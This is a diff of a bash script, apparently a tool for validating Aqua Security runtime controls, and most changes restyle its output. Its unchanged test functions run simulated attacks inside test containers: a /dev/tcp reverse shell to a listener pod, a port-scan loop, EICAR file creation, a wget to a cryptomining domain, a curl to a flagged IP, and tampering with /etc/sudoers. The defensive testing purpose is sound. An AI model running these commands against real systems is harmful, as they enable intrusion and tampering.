@@ -119,18 +119,24 @@ print_welcome_message() {
 # Flags management
 #
 print_help() {
-  echo "Usage: aqua-probe.sh [OPTIONS]"
-  echo
-  echo "Options:"
-  echo "  --daemonset <value>, -d <value>         Set the custom daemonset name where the Aqua Enforcer is deployed (default: aqua-agent,kube-enforcer-ds)"
-  echo "  --help, -h                              Show this help message and exit"
-  echo "  --image <value>, -i <value>             Set the Aqua Probe test image name (default: ericgomes56/aqua-probe:2.0)"
-  echo "  --namespace <value>, -ns <value>        Set the custom namespace where the Aqua Enforcer is deployed (default: aqua)"
-  echo "  --no-instructions, -n                   Skip prerequisites instructions"
-  echo "  --host-runtime                         Open Host Runtime controls without Kubernetes checks"
-  echo "  --version, -v                           Show the current Aqua Probe build version"
-  echo
-  echo
+    print_test_header 'Command-line Options' 'aqua-probe.sh'
+    print_wrapped_text text 'Usage: aqua-probe.sh [OPTIONS]'
+    echo
+    print_wrapped_text blue '--daemonset <name>, -ds <name>'
+    print_wrapped_text text 'Custom Aqua Enforcer DaemonSet name; built-in names are checked first.' '    ' '    '
+    print_wrapped_text blue '--help, -h'
+    print_wrapped_text text 'Show this help message and exit.' '    ' '    '
+    print_wrapped_text blue '--image <image>, -i <image>'
+    print_wrapped_text text 'Test image. Default: ericgomes56/aqua-probe:2.0' '    ' '    '
+    print_wrapped_text blue '--namespace <name>, -ns <name>'
+    print_wrapped_text text 'Aqua Enforcer namespace. Default: aqua' '    ' '    '
+    print_wrapped_text blue '--no-instructions, -n'
+    print_wrapped_text text 'Skip supported container prerequisites. Host tests still require confirmation.' '    ' '    '
+    print_wrapped_text blue '--host-runtime'
+    print_wrapped_text text 'Open host controls without Kubernetes startup checks.' '    ' '    '
+    print_wrapped_text blue '--version, -v'
+    print_wrapped_text text 'Show the current Aqua Probe build version.' '    ' '    '
+    echo
 }
 
 handle_flags() {
@@ -244,18 +250,37 @@ print_test_header() {
     echo
 }
 
-print_instructions() {
-    local line width
+print_wrapped_text() {
+    local tone="$1" text="$2" prefix="${3:-  }" continuation="${4:-  }" line width
     width=$(instruction_width)
-    print_colored_message yellow "BEFORE YOU BEGIN"
+    while IFS= read -r line; do
+        line="${line%"${line##*[![:space:]]}"}"
+        print_colored_message "$tone" "$prefix$line"
+        prefix=$continuation
+    done < <(printf '%s\n' "$text" | fold -s -w "$((width - ${#prefix}))")
+}
+
+print_instructions() {
+    local line prefix continuation numbered='^([0-9]+)[.)][[:space:]]+(.*)$'
+    print_wrapped_text "${3:-yellow}" "${2:-BEFORE YOU BEGIN}"
     while IFS= read -r line || [[ -n "$line" ]]; do
         line="${line#"${line%%[![:space:]]*}"}"
         [[ -n "$line" ]] || continue
-        while IFS= read -r line; do
-            print_colored_message text "  $line"
-        done < <(printf '%s\n' "$line" | fold -s -w "$((width - 2))")
+        if [[ "$line" =~ $numbered ]]; then
+            printf -v prefix '  %2s. ' "${BASH_REMATCH[1]}"
+            line=${BASH_REMATCH[2]}
+            printf -v continuation '%*s' "${#prefix}" ''
+            print_wrapped_text text "$line" "$prefix" "$continuation"
+        else
+            print_wrapped_text text "$line" '  - ' '    '
+        fi
     done <<< "$1"
     echo
+}
+
+print_step() {
+    print_wrapped_text blue 'RUN'
+    print_wrapped_text text "$1" '  > ' '    '
 }
 
 format_prompt() {
@@ -268,9 +293,11 @@ format_prompt() {
 
 print_audit_review() {
     echo
-    print_colored_message green "REVIEW IN AQUA"
-    print_colored_message blue '  Security Reports -> Audit'
-    print_colored_message text '  Review the event, effective policy, and affected workload.'
+    print_wrapped_text teal 'REVIEW IN AQUA'
+    print_wrapped_text blue 'Security Reports -> Audit' '  > ' '    '
+    print_wrapped_text text 'Match the event to the test time, effective policy, and affected workload or host.' '  - ' '    '
+    print_wrapped_text muted 'Verify Aqua evidence; a command error alone does not prove enforcement.' '  - ' '    '
+    echo
 }
 
 print_menu_option() {
@@ -374,7 +401,7 @@ deploy_test_container() {
     fi
 
     echo
-    print_colored_message yellow "Deploying Aqua test container..."
+    print_step "Deploying Aqua test container..."
     test_container_image=$(prompt_for_test_image "Enter image to deploy for the Aqua test container")
     ensure_test_namespace
     # Deploying the container using kubectl
@@ -405,7 +432,7 @@ EOF
 
     # Wait for the deployment to complete
     echo
-    print_colored_message yellow "Waiting for the deployment to complete..."
+    print_step "Waiting for the deployment to complete..."
     kubectl wait --for=condition=available deployment/aqua-test-container -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=60s
 
     # Check if deployment was successful
@@ -449,7 +476,7 @@ cleanup_aqua_probe_artifacts() {
     )
 
     echo
-    print_colored_message yellow "Cleaning up Aqua Probe Kubernetes test artifacts..."
+    print_step "Cleaning up Aqua Probe Kubernetes test artifacts..."
     kubectl delete pod -l aqua-probe-control=dedicated -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
 
     kubectl delete deployment "${test_deployments[@]}" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
@@ -462,7 +489,7 @@ cleanup_aqua_probe_artifacts() {
 
     if command -v docker >/dev/null 2>&1; then
         echo
-        print_colored_message yellow "Cleaning up Aqua Probe test artifacts..."
+        print_step "Cleaning up Aqua Probe test artifacts..."
         docker rm -f aqua-non-k8s-container >/dev/null 2>&1 || true
     fi
 }
@@ -471,7 +498,7 @@ apply_non_compliant_resource() {
     local resource_name="$1"
 
     echo
-    print_colored_message yellow "Applying non-compliant resource: $resource_name"
+    print_step "Applying non-compliant resource: $resource_name"
     kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f -
 }
 
@@ -502,7 +529,7 @@ cleanup_non_compliant_resources_lab() {
     )
 
     echo
-    print_colored_message yellow "Cleaning up non-compliant resource test artifacts..."
+    print_step "Cleaning up non-compliant resource test artifacts..."
 
     if kubectl get namespace "$lab_namespace" >/dev/null 2>&1; then
         kubectl delete pod "${lab_pods[@]}" -n "$lab_namespace" --ignore-not-found
@@ -549,14 +576,14 @@ test_realtime_malware_protection() {
         pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
         container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
         echo
-        print_colored_message yellow "Executing 'ls -la' command in the container..."
+        print_step "Executing 'ls -la' command in the container..."
         echo
         kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
         sleep 1.5
 
         # Create the eicar.txt file and write the concatenated string
         echo
-        print_colored_message yellow "Creating and writing EICAR string to eicar.txt in the container..."
+        print_step "Creating and writing EICAR string to eicar.txt in the container..."
         echo
         kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "touch /tmp/eicar.txt && echo '$eicar_string' > /tmp/eicar.txt"
         if [ $? -eq 0 ]; then
@@ -569,9 +596,9 @@ test_realtime_malware_protection() {
         
         sleep 1.5
         echo
-        print_colored_message yellow "Executing 'ls -la' command again in the container..."
+        print_step "Executing 'ls -la' command again in the container..."
         echo
-        print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
+        print_instructions "Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua." "CHECK THE RESULT" teal
         echo
         kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ls -la /tmp/
         echo
@@ -583,10 +610,10 @@ test_realtime_malware_protection() {
       ;;
 
     [Nn]*)
-      echo "Please ensure the prerequisites are met before proceeding."
+      print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
       ;;
     *)
-      echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+      print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
       ;;
   esac
 }
@@ -615,17 +642,17 @@ test_drift_prevention() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
+                print_step "Copying '/bin/wget' to '/tmp/wget_copy' in the container..."
                 echo
                 echo "kubectl exec -n $AQUA_PROBE_TEST_NAMESPACE -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy"
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cp /bin/wget /tmp/wget_copy
                 echo
-                print_colored_message yellow "Executing '/tmp/wget_copy' command in the container..."
+                print_step "Executing '/tmp/wget_copy' command in the container..."
                 echo
                 echo "kubectl exec -n $AQUA_PROBE_TEST_NAMESPACE -it $pod_name --container $container_name -- /tmp/wget_copy google.com"
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- /tmp/wget_copy google.com
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -633,10 +660,10 @@ test_drift_prevention() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -665,11 +692,11 @@ test_block_cryptocurrency_mining() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'wget http://crypto-loot.com' command in the container..."
+                print_step "Executing 'wget http://crypto-loot.com' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- wget http://crypto-loot.com
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -677,10 +704,10 @@ test_block_cryptocurrency_mining() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -709,10 +736,10 @@ test_block_fileless_execution() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing './memrun MASTER_HACKER_PROCESS_NAME_1337 target' command in the container..."
+                print_step "Executing './memrun MASTER_HACKER_PROCESS_NAME_1337 target' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- ./tmp/memrun MASTER_HACKER_PROCESS_NAME_1337 /tmp/target
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -720,10 +747,10 @@ test_block_fileless_execution() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -751,7 +778,7 @@ test_reverse_shell() {
             if check_container_existence; then
                 # Create a listener pod with nc listener
                 echo
-                print_colored_message yellow "Creating listener pod"
+                print_step "Creating listener pod"
                 listener_image=$(prompt_for_test_image "Enter image to deploy for the reverse shell listener pod")
                 ensure_test_namespace
                 kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
@@ -772,7 +799,7 @@ spec:
     - infinity
 EOF
                 echo
-                print_colored_message yellow "Waiting for the listener container pod to start running..."
+                print_step "Waiting for the listener container pod to start running..."
                 while ! kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" | grep listener | grep -q "Running"; do
                     sleep 5
                 done
@@ -781,26 +808,26 @@ EOF
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" listener -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                 echo
-                print_colored_message yellow "Retrieving IP address..."
+                print_step "Retrieving IP address..."
                 listener_pod_ip=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -o wide | grep listener | awk '{print $6}')
                 echo "$listener_pod_ip"
                 echo
-                print_colored_message yellow "Executing reverse shell from Aqua test container to listener container..."
+                print_step "Executing reverse shell from Aqua test container to listener container..."
                 echo
                 aqua_test_container=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$listener_pod_ip/12345 <&1"
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
             else
                 print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -830,13 +857,13 @@ test_executables_blocked() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing the blocked 'ps' command in the container..."
+                print_step "Executing the blocked 'ps' command in the container..."
                 echo
                 echo "kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c ps"
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "ps"
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -844,10 +871,10 @@ test_executables_blocked() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -878,7 +905,7 @@ test_block_container_exec() {
                 echo
         kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -886,10 +913,10 @@ test_block_container_exec() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -918,11 +945,11 @@ test_bad_dns_ip_reputation() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'curl http://68.183.212.246' command in the container..."
+                print_step "Executing 'curl http://68.183.212.246' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- curl http://68.183.212.246
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -930,10 +957,10 @@ test_bad_dns_ip_reputation() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -963,11 +990,11 @@ test_file_block() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'cat /etc/passwd' command in the container..."
+                print_step "Executing 'cat /etc/passwd' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- cat /etc/passwd
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -975,10 +1002,10 @@ test_file_block() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1008,11 +1035,11 @@ test_package_block() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'tar' command in the container..."
+                print_step "Executing 'tar' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- tar
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -1020,10 +1047,10 @@ test_package_block() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1052,12 +1079,12 @@ test_port_scanning_detection() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing port scan command in the container..."
+                print_step "Executing port scan command in the container..."
                 echo
                 echo 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'for p in {1..1024}; do timeout 1 bash -c "echo >/dev/tcp/10.0.0.1/$p" 2>/dev/null & done; wait'
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because it has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -1065,10 +1092,10 @@ test_port_scanning_detection() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1093,7 +1120,7 @@ test_block_non_compliant_images() {
     case $prerequisites_met in
         [Yy]*)
             echo
-            print_colored_message yellow "Deploying non-compliant image test container with image: jerbi/eicar:latest"
+            print_step "Deploying non-compliant image test container with image: jerbi/eicar:latest"
             echo
             ensure_test_namespace
             kubectl delete deployment aqua-non-compliant-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
@@ -1122,15 +1149,15 @@ spec:
         - infinity
 EOF
             echo
-            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is non-compliant."
+            print_instructions "Observe that the deployment or pod creation is blocked because the image is non-compliant." "CHECK THE RESULT" teal
             echo
             print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the non-compliant image details."
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1159,7 +1186,7 @@ test_block_unregistered_images() {
             unregistered_image=$(prompt_for_test_image "Enter image to deploy for the unregistered image test")
 
             echo
-            print_colored_message yellow "Deploying unregistered image test container with image: $unregistered_image"
+            print_step "Deploying unregistered image test container with image: $unregistered_image"
             echo
             ensure_test_namespace
             kubectl delete deployment aqua-unregistered-image-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
@@ -1188,15 +1215,15 @@ spec:
         - infinity
 EOF
             echo
-            print_colored_message yellow "[!] Observe that the deployment or pod creation is blocked because the image is unregistered."
+            print_instructions "Observe that the deployment or pod creation is blocked because the image is unregistered." "CHECK THE RESULT" teal
             echo
             print_colored_message green "[✓] Please login to the Aqua Console's Assurance and Risk Explorer screens to view the unregistered image details."
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1226,7 +1253,7 @@ test_file_integrity_monitoring() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing File Integrity Monitoring create, modify, permission change, and delete actions in the container..."
+                print_step "Executing File Integrity Monitoring create, modify, permission change, and delete actions in the container..."
                 echo
                 cat <<'EOF'
 # Create a file
@@ -1241,22 +1268,22 @@ chmod 777 /etc/sudoers
 # Delete a file
 rm /etc/sudoers
 EOF
-                print_colored_message yellow "Preparing baseline '/etc/sudoers' file..."
+                print_step "Preparing baseline '/etc/sudoers' file..."
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'touch /etc/sudoers'
 
-                print_colored_message yellow "Creating '/etc/backdoor.conf'..."
+                print_step "Creating '/etc/backdoor.conf'..."
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "malicious change" > /etc/backdoor.conf'
 
-                print_colored_message yellow "Modifying '/etc/sudoers'..."
+                print_step "Modifying '/etc/sudoers'..."
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c 'echo "debug=true" >> /etc/sudoers'
 
-                print_colored_message yellow "Changing permissions on '/etc/sudoers'..."
+                print_step "Changing permissions on '/etc/sudoers'..."
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- chmod 777 /etc/sudoers
 
-                print_colored_message yellow "Deleting '/etc/sudoers'..."
+                print_step "Deleting '/etc/sudoers'..."
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- rm /etc/sudoers
                 echo
-                print_colored_message yellow "[!] Observe that file create, modify, permission change, or delete activity was detected by Aqua."
+                print_instructions "Observe that file create, modify, permission change, or delete activity was detected by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -1264,10 +1291,10 @@ EOF
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1296,11 +1323,11 @@ test_system_integrity_monitoring() {
                 pod_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                 container_name=$(kubectl get pods -n "$AQUA_PROBE_TEST_NAMESPACE" $pod_name -o jsonpath='{.spec.containers[0].name}')
                 echo
-                print_colored_message yellow "Executing 'date +%T -s \"10:00:00\"' command in the container..."
+                print_step "Executing 'date +%T -s \"10:00:00\"' command in the container..."
                 echo
                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- date +%T -s "10:00:00"
                 echo
-                print_colored_message yellow "[!] Observe that system time change activity was detected by Aqua."
+                print_instructions "Observe that system time change activity was detected by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -1308,10 +1335,10 @@ test_system_integrity_monitoring() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1348,7 +1375,7 @@ test_limit_container_privileges() {
         [Yy]*)
             echo
             privilege_test_image=$(prompt_for_test_image "Enter image to deploy for the Limit Container Privileges tests")
-            print_colored_message yellow "Cleaning up previous Limit Container Privileges test pods..."
+            print_step "Cleaning up previous Limit Container Privileges test pods..."
             ensure_test_namespace
             kubectl delete pod host-network-test cap-add-test root-user-test privileged-test host-ipc-test host-pid-test host-userns-test host-uts-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
 
@@ -1508,10 +1535,10 @@ EOF
             print_audit_review
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1540,21 +1567,21 @@ test_block_non_kubernetes_containers() {
         [Yy]*)
             echo
             non_k8s_image=$(prompt_for_test_image "Enter image to deploy for the non-Kubernetes container test")
-            print_colored_message yellow "Deploying Docker-only container with image: $non_k8s_image"
+            print_step "Deploying Docker-only container with image: $non_k8s_image"
             echo
             echo "docker run -d --name aqua-non-k8s-container $non_k8s_image sleep 3600"
             docker rm -f aqua-non-k8s-container >/dev/null 2>&1
             docker run -d --name aqua-non-k8s-container $non_k8s_image sleep 3600
             echo
-            print_colored_message yellow "[!] Observe that the Docker-only container is blocked because it was started outside Kubernetes."
+            print_instructions "Observe that the Docker-only container is blocked because it was started outside Kubernetes." "CHECK THE RESULT" teal
             echo
             print_audit_review
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1599,12 +1626,12 @@ test_port_block() {
                 fi
 
                 echo
-                print_colored_message yellow "Executing TCP connection test to $port_block_host:$port_block_port in the container..."
+                print_step "Executing TCP connection test to $port_block_host:$port_block_port in the container..."
                 echo
                 echo "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
